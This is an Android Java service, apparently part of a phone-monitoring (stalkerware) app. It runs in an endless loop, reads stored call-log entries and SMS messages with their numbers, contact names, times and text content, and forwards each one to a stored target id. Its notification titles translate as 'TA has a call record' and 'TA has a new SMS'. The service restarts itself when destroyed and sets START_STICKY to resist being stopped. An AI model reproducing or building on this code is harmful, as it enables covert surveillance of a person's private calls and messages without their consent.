package com.example.service;

import com.example.db.DBHelper;
import com.example.db.GeneralData;
import com.example.thread.SendMsgThread;
import com.example.utils.MyUtils;
import com.example.utils.SharedpreferencesUtil;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;
import android.util.Log;

public class SendNotMsgService extends Service {

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		//
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				while (true) {
					System.out.println("SendNotMsgService oncr");
					if (MyUtils.isConnect(getApplicationContext())) {
						System.out.println("isConnect");
						DBHelper dbHelper = new DBHelper(
								getApplicationContext(), "lpsq", null, 1);
						SQLiteDatabase database = dbHelper
								.getWritableDatabase();
						// phone
						Cursor cursor_phone = database.rawQuery(
								"select * from NOTPHONEDATA ", null);
						cursor_phone.moveToFirst();
						while (!cursor_phone.isAfterLast()) {
							String str_phone = Integer.valueOf(cursor_phone
									.getInt(cursor_phone.getColumnIndex("type")))
									+ "#"
									+ cursor_phone.getString(cursor_phone
											.getColumnIndex("num"))
									+ "#"
									+ cursor_phone.getString(cursor_phone
											.getColumnIndex("dis_name"))
									+ "#"
									+ cursor_phone.getString(cursor_phone
											.getColumnIndex("_time"))
									+ "#"
									+ cursor_phone.getString(cursor_phone
											.getColumnIndex("time"));
							Log.e("SendNotMsgThread", str_phone);
							GeneralData gd = new GeneralData("TA有一条通话信息",
									str_phone, GeneralData.TYPE_PHONE,
									new SharedpreferencesUtil(
											getApplicationContext())
											.getTargetId());
							new SendMsgThread(gd, getApplicationContext())
									.start();
							try {
								Thread.sleep(1000);
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							cursor_phone.moveToNext();
						}
					
						// sms
						Cursor cursor_sms = database.rawQuery(
								"select * from NOTSMSDATA ", null);
						cursor_sms.moveToFirst();
						while (!cursor_sms.isAfterLast()) {
							String str_sms = Integer.valueOf(cursor_sms
									.getString(cursor_sms.getColumnIndex("type")))
									+ "#"
									+ cursor_sms.getString(cursor_sms
											.getColumnIndex("num"))
									+ "#"
									+ cursor_sms.getString(cursor_sms
											.getColumnIndex("dis_name"))
									+ "#"
									+ cursor_sms.getString(cursor_sms
											.getColumnIndex("time"))
									+ "#"
									+ cursor_sms.getString(cursor_sms
											.getColumnIndex("content"));
							Log.e("SendNotMsgThread", str_sms);
							GeneralData gd = new GeneralData("TA有一条新短信",
									str_sms, GeneralData.TYPE_SMS,
									new SharedpreferencesUtil(
											getApplicationContext())
											.getTargetId());
							new SendMsgThread(gd, getApplicationContext())
									.start();
							try {
								Thread.sleep(1000);
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							cursor_sms.moveToNext();
						}
						cursor_sms.close();
						cursor_phone.close();
						database.close();
					}
					try {
						Thread.sleep(10000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		}).start();

	}

	@Override
	public void onDestroy() {
		Intent service = new Intent(this, SendNotMsgService.class);
		startService(service);
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);
	}

}
